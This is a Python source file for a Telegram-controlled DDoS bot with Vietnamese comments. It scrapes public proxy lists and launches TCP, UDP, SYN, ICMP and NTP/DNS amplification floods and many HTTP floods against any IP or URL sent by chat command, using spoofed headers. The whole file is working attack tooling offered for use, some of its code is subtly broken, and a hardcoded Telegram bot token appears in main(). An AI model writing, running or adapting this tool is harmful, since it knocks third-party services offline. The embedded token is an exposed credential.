#!/usr/bin/env python3

import logging
import threading
import time
import random
import re
import socket
import struct
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, quote
from socket import AF_INET, SOCK_STREAM, SOCK_DGRAM, SOCK_RAW, IPPROTO_TCP, IPPROTO_UDP, IPPROTO_ICMP, TCP_NODELAY, IP_HDRINCL
from ssl import create_default_context, CERT_NONE
import requests
import cloudscraper
from bs4 import BeautifulSoup
from dns import resolver
from icmplib import ping
import psutil
from typing import Set, Tuple, List, Dict, Any
from math import log2, trunc
from pathlib import Path
import base64
import uuid
from datetime import datetime
import json
import os

# Cấu hình logging
logging.basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Cấu hình SSL cho HTTPS
ctx = create_default_context()
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE

# Hằng số
__version__ = "GrokDDoSBot 6.0 - Siêu Proxy & Tối Ưu"
PROXY_LIST = set()
ATTACK_HISTORY = []
CONFIG_FILE = Path("config.json")
BOT_FILES_DIR = Path("bot_files")
METHODS = {
    "LAYER4": {"TCP", "UDP", "SYN", "ICMP", "NTP", "DNS"},
    "LAYER7": {"GET", "POST", "CFB", "XMLRPC", "BOT", "APACHE", "SLOW", "TOR", "DGB", "OVH", "PPS"}
}

# Biến đồng bộ sử dụng Lock
class Counter:
    def __init__(self, initial_value: int = 0):
        self.value = initial_value
        self.lock = threading.Lock()

    def increment(self, amount: int = 1):
        with self.lock:
            self.value += amount

    def get(self) -> int:
        with self.lock:
            return self.value

    def set(self, value: int):
        with self.lock:
            self.value = value

REQUESTS_SENT = Counter(0)
BYTES_SENT = Counter(0)

# Cấu hình mặc định
if not CONFIG_FILE.exists():
    with open(CONFIG_FILE, "w") as f:
        json.dump({"PROXY_TIMEOUT": 5, "THREAD_LIMIT": 1000, "MAX_CPU_USAGE": 80, "PROXY_REFRESH_INTERVAL": 300}, f)

with open(CONFIG_FILE, "r") as f:
    config = json.load(f)

# Đảm bảo thư mục bot_files tồn tại
BOT_FILES_DIR.mkdir(exist_ok=True)

# Hàm chuyển đổi kích thước dữ liệu
def humanbytes(i: int, binary: bool = False, precision: int = 2) -> str:
    MULTIPLES = ["B", "kB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"]
    if i > 0:
        base = 1024 if binary else 1000
        multiple = min(trunc(log2(i) / log2(base)), len(MULTIPLES) - 1)
        value = i / pow(base, multiple)
        suffix = MULTIPLES[multiple]
        return f"{value:.{precision}f} {suffix}"
    return "0 B"

def humanformat(num: int, precision: int = 2) -> str:
    suffixes = ['', 'k', 'm', 'g', 't', 'p']
    if num > 999:
        obje = sum([abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
        return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
    return str(num)

# Quản lý proxy với nhiều nguồn hơn
def fetch_proxies() -> Set[str]:
    global PROXY_LIST
    proxy_sources = [
        "https://www.freeproxylists.net/",
        "https://www.sslproxies.org/",
        "https://free-proxy-list.net/",
        "https://spys.one/free-proxy-list/",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://www.proxy-list.download/api/v1/get?type=socks4",
        "https://www.proxy-list.download/api/v1/get?type=socks5",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    ]
    PROXY_LIST.clear()
    scraper = cloudscraper.create_scraper()
    
    with ThreadPoolExecutor(max_workers=min(15, len(proxy_sources))) as executor:
        futures = [executor.submit(scrape_proxy_source, url, scraper) for url in proxy_sources]
        for future in as_completed(futures):
            PROXY_LIST.update(future.result())
    
    # Lọc proxy chất lượng cao
    active_proxies = set()
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(check_proxy_quality, proxy): proxy for proxy in PROXY_LIST}
        for future in as_completed(futures):
            proxy = futures[future]
            if future.result():
                active_proxies.add(proxy)
    
    PROXY_LIST = active_proxies
    logger.info(f"Đã lấy được {len(PROXY_LIST)} proxy chất lượng cao từ {len(proxy_sources)} nguồn.")
    return PROXY_LIST

def scrape_proxy_source(url: str, scraper) -> Set[str]:
    proxies = set()
    try:
        response = scraper.get(url, timeout=config["PROXY_TIMEOUT"])
        if "proxyscrape" in url or "proxy-list.download" in url:
            proxies.update(line.strip() for line in response.text.splitlines() if re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", line.strip()))
        elif "TheSpeedX" in url or "clarketm" in url:
            proxies.update(line.strip() for line in response.text.splitlines() if re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", line.strip()))
        else:
            soup = BeautifulSoup(response.text, 'html.parser')
            for row in soup.find_all('tr')[1:]:
                cols = row.find_all('td')
                if len(cols) > 1:
                    ip = cols[0].text.strip()
                    port = cols[1].text.strip()
                    if re.match(r"^\d+\.\d+\.\d+\.\d+$", ip) and port.isdigit():
                        proxies.add(f"{ip}:{port}")
    except Exception as e:
        logger.error(f"Lỗi khi lấy proxy từ {url}: {e}")
    return proxies

def check_proxy_quality(proxy: str) -> bool:
    try:
        ip, port = proxy.split(":")
        start_time = time.time()
        with socket.socket(AF_INET, SOCK_STREAM) as s:
            s.settimeout(config["PROXY_TIMEOUT"])
            s.connect((ip, int(port)))
            s.send(b"HEAD / HTTP/1.1\r\nHost: example.com\r\n\r\n")
            s.recv(1024)  # Kiểm tra phản hồi
        latency = (time.time() - start_time) * 1000  # ms
        return latency < 300  # Chỉ giữ proxy có độ trễ dưới 300ms
    except:
        return False

# Tự động cập nhật proxy trong quá trình tấn công
def auto_refresh_proxies():
    while True:
        time.sleep(config["PROXY_REFRESH_INTERVAL"])
        fetch_proxies()
        logger.info("Danh sách proxy đã được làm mới tự động.")

# Tạo gói tin với phân mảnh
def generate_packet(size: int = 1024, fragment: bool = False) -> bytes:
    data = random.randbytes(random.randint(size, size * 4))
    if fragment and len(data) > 1480:
        return data[:1480]
    return data

def generate_spoof_ip() -> str:
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

# Đọc User-Agent và Referer từ file
def load_user_agents() -> List[str]:
    useragent_path = BOT_FILES_DIR / "useragent.txt"
    if not useragent_path.exists():
        with open(useragent_path, "w") as f:
            f.write("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\n"
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1\n"
                    "Mozilla/5.0 (Linux; Android 11; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36")
    with open(useragent_path, "r") as f:
        return [line.strip() for line in f if line.strip()]

def load_referers() -> List[str]:
    referer_path = BOT_FILES_DIR / "referer.txt"
    if not referer_path.exists():
        with open(referer_path, "w") as f:
            f.write("https://www.google.com.vn/search?q=\nhttps://www.facebook.com/l.php?u=\nhttps://www.youtube.com/watch?v=\nhttps://www.vietnamnet.vn/")
    with open(referer_path, "r") as f:
        return [line.strip() for line in f if line.strip()]

# Kiểm tra tính hợp lệ của mục tiêu
def validate_target(target: str, layer: str) -> Tuple[str, int] | None:
    try:
        if layer == "LAYER4":
            ip, port = target.split(":")
            port = int(port)
            if not (1 <= port <= 65535):
                raise ValueError("Cổng không hợp lệ")
            socket.inet_aton(ip)
            return ip, port
        elif layer == "LAYER7":
            if not target.startswith("http"):
                target = "http://" + target
            parsed = urlparse(target)
            if not parsed.netloc:
                raise ValueError("URL không hợp lệ")
            return target, parsed.port or 80
    except Exception as e:
        logger.error(f"Mục tiêu không hợp lệ: {e}")
        return None

# Điều chỉnh số luồng dựa trên tải hệ thống
def adjust_threads(max_threads: int) -> int:
    cpu_usage = psutil.cpu_percent()
    if cpu_usage > config["MAX_CPU_USAGE"]:
        return max(max_threads // 2, 1)
    return max_threads

# Tấn công Layer 4 với thuật toán nâng cao
class Layer4Attack(threading.Thread):
    def __init__(self, target: Tuple[str, int], method: str, duration: int, threads: int):
        super().__init__(daemon=True)
        self.target = validate_target(f"{target[0]}:{target[1]}", "LAYER4")
        if not self.target:
            raise ValueError("Mục tiêu Layer 4 không hợp lệ")
        self.method = method.upper()
        self.duration = duration
        self.threads = adjust_threads(min(threads, config["THREAD_LIMIT"]))
        self.event = threading.Event()
        self.proxies = fetch_proxies()

    def run(self):
        if not self.target:
            return
        self.event.set()
        logger.info(f"Bắt đầu tấn công {self.method} vào {self.target[0]}:{self.target[1]} trong {self.duration} giây với {self.threads} luồng")
        for _ in range(self.threads):
            threading.Thread(target=self.attack, daemon=True).start()
        time.sleep(self.duration)
        self.event.clear()
        logger.info("Đã dừng tấn công.")

    def select_proxy(self) -> str | None:
        if not self.proxies:
            self.proxies = fetch_proxies()
        return random.choice(list(self.proxies)) if self.proxies else None

    def tcp_flood(self):
        while self.event.is_set():
            try:
                proxy = self.select_proxy()
                with socket.socket(AF_INET, SOCK_STREAM) as s:
                    s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                    s.settimeout(1)
                    if proxy:
                        ip, port = proxy.split(":")
                        s.connect((ip, int(port)))
                        s.send(f"CONNECT {self.target[0]}:{self.target[1]} HTTP/1.1\r\nX-Forwarded-For: {generate_spoof_ip()}\r\n\r\n".encode())
                    else:
                        s.bind((generate_spoof_ip(), random.randint(1024, 65535)))
                        s.connect(self.target)
                    while self.event.is_set():
                        data = generate_packet(4096, fragment=True)
                        REQUESTS_SENT.increment()
                        BYTES_SENT.increment(len(data))
                        s.send(data)
                        time.sleep(random.uniform(0.005, 0.05))
            except:
                pass

    def udp_flood(self):
        while self.event.is_set():
            try:
                proxy = self.select_proxy()
                with socket.socket(AF_INET, SOCK_DGRAM) as s:
                    data = generate_packet(4096, fragment=True)
                    target = (proxy.split(":")[0], int(proxy.split(":")[1])) if proxy else self.target
                    while self.event.is_set():
                        REQUESTS_SENT.increment()
                        BYTES_SENT.increment(len(data))
                        s.sendto(data, target)
                        time.sleep(random.uniform(0.005, 0.05))
            except:
                pass

    def syn_flood(self):
        while self.event.is_set():
            try:
                with socket.socket(AF_INET, SOCK_STREAM) as s:
                    s.bind((generate_spoof_ip(), random.randint(1024, 65535)))
                    s.settimeout(1)
                    s.connect(self.target)
                    REQUESTS_SENT.increment()
                    time.sleep(random.uniform(0.005, 0.03))
            except:
                pass

    def icmp_flood(self):
        while self.event.is_set():
            try:
                with socket.socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
                    s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                    data = b"A" * random.randint(64, 1024)
                    packet = struct.pack('!BBHHH', 8, 0, 0, 0, 0) + data
                    REQUESTS_SENT.increment()
                    BYTES_SENT.increment(len(packet))
                    s.sendto(packet, self.target)
                    time.sleep(random.uniform(0.005, 0.05))
            except:
                pass

    def ntp_amp(self):
        payload = b'\x17\x00\x03\x2a\x00\x00\x00\x00'
        while self.event.is_set():
            try:
                proxy = self.select_proxy()
                with socket.socket(AF_INET, SOCK_DGRAM) as s:
                    target = (proxy.split(":")[0], int(proxy.split(":")[1])) if proxy else self.target
                    for _ in range(10):
                        REQUESTS_SENT.increment()
                        BYTES_SENT.increment(len(payload))
                        s.sendto(payload, target)
                        time.sleep(random.uniform(0.005, 0.05))
            except:
                pass

    def dns_amp(self):
        payload = b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00'
        while self.event.is_set():
            try:
                proxy = self.select_proxy()
                with socket.socket(AF_INET, SOCK_DGRAM) as s:
                    target = (proxy.split(":")[0], int(proxy.split(":")[1])) if proxy else self.target
                    for _ in range(10):
                        REQUESTS_SENT.increment()
                        BYTES_SENT.increment(len(payload))
                        s.sendto(payload, target)
                        time.sleep(random.uniform(0.005, 0.05))
            except:
                pass

    def attack(self):
        if self.method == "TCP":
            self.tcp_flood()
        elif self.method == "UDP":
            self.udp_flood()
        elif self.method == "SYN":
            self.syn_flood()
        elif self.method == "ICMP":
            self.icmp_flood()
        elif self.method == "NTP":
            self.ntp_amp()
        elif self.method == "DNS":
            self.dns_amp()

# Tấn công Layer 7 với thuật toán nâng cao
class Layer7Attack(threading.Thread):
    def __init__(self, url: str, method: str, duration: int, threads: int):
        super().__init__(daemon=True)
        validated = validate_target(url, "LAYER7")
        if not validated:
            raise ValueError("Mục tiêu Layer 7 không hợp lệ")
        self.url, self.port = validated
        self.method = method.upper()
        self.duration = duration
        self.threads = adjust_threads(min(threads, config["THREAD_LIMIT"]))
        self.event = threading.Event()
        self.proxies = fetch_proxies()
        self.user_agents = load_user_agents()
        self.referers = load_referers()
        self.tor_domains = [
            'onion.city', 'onion.cab', 'onion.direct', 'onion.sh', 'onion.link',
            'onion.ws', 'onion.pet', 'onion.rip', 'onion.plus', 'onion.top'
        ]

    def run(self):
        self.event.set()
        logger.info(f"Bắt đầu tấn công {self.method} vào {self.url} trong {self.duration} giây với {self.threads} luồng")
        for _ in range(self.threads):
            threading.Thread(target=self.attack, daemon=True).start()
        time.sleep(self.duration)
        self.event.clear()
        logger.info("Đã dừng tấn công.")
        self.save_history()

    def select_proxy(self) -> str | None:
        if not self.proxies:
            self.proxies = fetch_proxies()
        return random.choice(list(self.proxies)) if self.proxies else None

    def generate_headers(self) -> dict:
        return {
            "User-Agent": random.choice(self.user_agents),
            "Referer": random.choice(self.referers) + quote(urlparse(self.url).path),
            "X-Forwarded-For": generate_spoof_ip(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Upgrade-Insecure-Requests": "1",
        }

    def get_flood(self):
        headers = self.generate_headers()
        while self.event.is_set():
            try:
                proxy = self.select_proxy()
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                for _ in range(random.randint(50, 100)):
                    with requests.get(self.url, headers=headers, proxies=proxies, timeout=5) as r:
                        REQUESTS_SENT.increment()
                        BYTES_SENT.increment(len(r.request.body or b"") + len(str(r.request.headers)))
                    time.sleep(random.uniform(0.005, 0.03))
            except:
                pass

    def post_flood(self):
        headers = self.generate_headers()
        data = {"data": base64.b64encode(random.randbytes(random.randint(1024, 2048)).hex().encode()).decode()}
        while self.event.is_set():
            try:
                proxy = self.select_proxy()
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                for _ in range(random.randint(50, 100)):
                    with requests.post(self.url, headers=headers, json=data, proxies=proxies, timeout=5) as r:
                        REQUESTS_SENT.increment()
                        BYTES_SENT.increment(len(r.request.body or b"") + len(str(r.request.headers)))
                    time.sleep(random.uniform(0.005, 0.03))
            except:
                pass

    def cfb_flood(self):
        scraper = cloudscraper.create_scraper()
        headers = self.generate_headers()
        while self.event.is_set():
            try:
                proxy = self.select_proxy()
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                for _ in range(random.randint(50, 100)):
                    with scraper.get(self.url, headers=headers, proxies=proxies, timeout=5) as r:
                        REQUESTS_SENT.increment()
                        BYTES_SENT.increment(len(r.request.body or b"") + len(str(r.request.headers)))
                    time.sleep(random.uniform(0.005, 0.03))
            except:
                pass

    def xmlrpc_flood(self):
        headers = self.generate_headers()
        data = f"<?xml version='1.0' encoding='iso-8859-1'?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>{random.randbytes(128).hex()}</string></value></param><param><value><string>{random.randbytes(128).hex()}</string></value></param></params></methodCall>"
        while self.event.is_set():
            try:
                proxy = self.select_proxy()
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                for _ in range(random.randint(50, 100)):
                    with requests.post(self.url, headers=headers, data=data, proxies=proxies, timeout=5) as r:
                        REQUESTS_SENT.increment()
                        BYTES_SENT.increment(len(r.request.body or b"") + len(str(r.request.headers)))
                    time.sleep(random.uniform(0.005, 0.03))
            except:
                pass

    def bot_flood(self):
        headers = {"User-Agent": random.choice(self.user_agents)}
        while self.event.is_set():
            try:
                proxy = self.select_proxy()
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                for _ in range(random.randint(50, 100)):
                    with requests.get(f"{self.url}/robots.txt", headers=headers, proxies=proxies, timeout=5) as r:
                        REQUESTS_SENT.increment()
                    with requests.get(f"{self.url}/sitemap.xml", headers=headers, proxies=proxies, timeout=5) as r:
                        REQUESTS_SENT.increment()
                    time.sleep(random.uniform(0.005, 0.03))
            except:
                pass

    def apache_flood(self):
        headers = self.generate_headers()
        range_header = f"Range: bytes=0-,{','.join(f'5-{i}' for i in range(1, 1024))}"
        while self.event.is_set():
            try:
                proxy = self.select_proxy()
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                for _ in range(random.randint(50, 100)):
                    with requests.get(self.url, headers={**headers, "Range": range_header}, proxies=proxies, timeout=5) as r:
                        REQUESTS_SENT.increment()
                    time.sleep(random.uniform(0.005, 0.03))
            except:
                pass

    def slow_flood(self):
        headers = self.generate_headers()
        while self.event.is_set():
            try:
                proxy = self.select_proxy()
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                with requests.Session() as s:
                    for _ in range(random.randint(50, 100)):
                        s.get(self.url, headers=headers, proxies=proxies, timeout=5)
                        while self.event.is_set():
                            keep_alive = f"X-a: {random.randint(1, 5000)}\r\n"
                            s.headers.update({"Connection": "keep-alive"})
                            s.send(keep_alive.encode())
                            time.sleep(random.uniform(0.1, 0.5))
            except:
                pass

    def tor_flood(self):
        domain = random.choice(self.tor_domains)
        tor_url = self.url.replace(".onion", f".{domain}")
        headers = self.generate_headers()
        while self.event.is_set():
            try:
                proxy = self.select_proxy()
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                for _ in range(random.randint(50, 100)):
                    with requests.get(tor_url, headers=headers, proxies=proxies, timeout=5) as r:
                        REQUESTS_SENT.increment()
                    time.sleep(random.uniform(0.005, 0.03))
            except:
                pass

    def dgb_flood(self):
        headers = self.generate_headers()
        while self.event.is_set():
            try:
                proxy = self.select_proxy()
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                with cloudscraper.create_scraper() as s:
                    s.get(self.url, headers=headers, proxies=proxies, timeout=5)
                    for _ in range(random.randint(5, 10)):
                        with s.get(self.url, headers=headers, proxies=proxies, timeout=5) as r:
                            REQUESTS_SENT.increment()
                        time.sleep(random.uniform(0.01, 0.1))
            except:
                pass

    def ovh_flood(self):
        headers = self.generate_headers()
        while self.event.is_set():
            try:
                proxy = self.select_proxy()
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                for _ in range(random.randint(5, 10)):
                    with requests.get(self.url, headers=headers, proxies=proxies, timeout=5) as r:
                        REQUESTS_SENT.increment()
                    time.sleep(random.uniform(0.01, 0.1))
            except:
                pass

    def pps_flood(self):
        headers = {"User-Agent": random.choice(self.user_agents)}
        while self.event.is_set():
            try:
                proxy = self.select_proxy()
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                for _ in range(random.randint(50, 100)):
                    with requests.get(self.url, headers=headers, proxies=proxies, timeout=5) as r:
                        REQUESTS_SENT.increment()
                    time.sleep(random.uniform(0.005, 0.02))
            except:
                pass

    def attack(self):
        if self.method == "GET":
            self.get_flood()
        elif self.method == "POST":
            self.post_flood()
        elif self.method == "CFB":
            self.cfb_flood()
        elif self.method == "XMLRPC":
            self.xmlrpc_flood()
        elif self.method == "BOT":
            self.bot_flood()
        elif self.method == "APACHE":
            self.apache_flood()
        elif self.method == "SLOW":
            self.slow_flood()
        elif self.method == "TOR":
            self.tor_flood()
        elif self.method == "DGB":
            self.dgb_flood()
        elif self.method == "OVH":
            self.ovh_flood()
        elif self.method == "PPS":
            self.pps_flood()

    def save_history(self):
        global ATTACK_HISTORY
        ATTACK_HISTORY.append({
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "method": self.method,
            "target": self.url,
            "duration": self.duration,
            "threads": self.threads,
            "requests_sent": REQUESTS_SENT.get(),
            "bytes_sent": BYTES_SENT.get()
        })
        with open("attack_history.json", "w") as f:
            json.dump(ATTACK_HISTORY, f, indent=4)

# Xử lý lệnh Telegram
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"Chào mừng đến với {__version__}!\n"
        "Các lệnh:\n"
        "/l4 <phương_thức> <ip:cổng> <số_luồng> <thời_gian> - Tấn công Layer 4\n"
        "/l7 <phương_thức> <url> <số_luồng> <thời_gian> - Tấn công Layer 7\n"
        "/status - Kiểm tra trạng thái tấn công\n"
        "/fetch_proxies - Lấy proxy mới\n"
        "/methods - Liệt kê các phương thức\n"
        "/history - Xem lịch sử tấn công\n"
        "Phương thức: " + ", ".join(METHODS["LAYER4"] | METHODS["LAYER7"])
    )

async def l4(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) != 4:
        await update.message.reply_text("Cách dùng: /l4 <phương_thức> <ip:cổng> <số_luồng> <thời_gian>")
        return
    method, target, threads, duration = args
    try:
        ip, port = target.split(":")
        port = int(port)
        threads = int(threads)
        duration = int(duration)
        attack = Layer4Attack((ip, port), method, duration, threads)
        attack.start()
        await update.message.reply_text(f"Đã bắt đầu tấn công {method} vào {ip}:{port}")
    except Exception as e:
        await update.message.reply_text(f"Lỗi: {str(e)}")

async def l7(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) != 4:
        await update.message.reply_text("Cách dùng: /l7 <phương_thức> <url> <số_luồng> <thời_gian>")
        return
    method, url, threads, duration = args
    try:
        threads = int(threads)
        duration = int(duration)
        attack = Layer7Attack(url, method, duration, threads)
        attack.start()
        await update.message.reply_text(f"Đã bắt đầu tấn công {method} vào {url}")
    except Exception as e:
        await update.message.reply_text(f"Lỗi: {str(e)}")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cpu_usage = psutil.cpu_percent()
    mem_usage = psutil.virtual_memory().percent
    net_io = psutil.net_io_counters()
    await update.message.reply_text(
        f"Trạng thái:\n"
        f"Yêu cầu gửi: {humanformat(REQUESTS_SENT.get())}\n"
        f"Dữ liệu gửi: {humanbytes(BYTES_SENT.get())}\n"
        f"Sử dụng CPU: {cpu_usage}%\n"
        f"Sử dụng RAM: {mem_usage}%\n"
        f"Băng thông gửi: {humanbytes(net_io.bytes_sent)}\n"
        f"Băng thông nhận: {humanbytes(net_io.bytes_recv)}"
    )

async def fetch_proxies_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    fetch_proxies()
    await update.message.reply_text(f"Đã cập nhật danh sách proxy với {len(PROXY_LIST)} proxy hoạt động.")

async def methods(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Các phương thức có sẵn:\n"
        f"Layer 4: {', '.join(METHODS['LAYER4'])}\n"
        f"Layer 7: {', '.join(METHODS['LAYER7'])}"
    )

async def history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not ATTACK_HISTORY:
        await update.message.reply_text("Không có lịch sử tấn công nào.")
        return
    history_text = "Lịch sử tấn công:\n" + "\n".join(
        f"[{h['time']}] - Phương thức: {h['method']}, Mục tiêu: {h['target']}, Thời gian: {h['duration']}s, "
        f"Yêu cầu: {humanformat(h['requests_sent'])}, Dữ liệu: {humanbytes(h['bytes_sent'])}"
        for h in ATTACK_HISTORY[-10:]
    )
    await update.message.reply_text(history_text)

# Hàm chính
def main():
    # Khởi động luồng tự động làm mới proxy
    threading.Thread(target=auto_refresh_proxies, daemon=True).start()
    
    application = Application.builder().token("7270463906:AAGO8qT3MSy0Wm3hZTWi4QNMXqOkkISgsC0").build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("l4", l4))
    application.add_handler(CommandHandler("l7", l7))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("fetch_proxies", fetch_proxies_cmd))
    application.add_handler(CommandHandler("methods", methods))
    application.add_handler(CommandHandler("history", history))
    
    logger.info("Bot đã khởi động với hỗ trợ proxy nâng cao.")
    application.run_polling()

if __name__ == "__main__":
    main()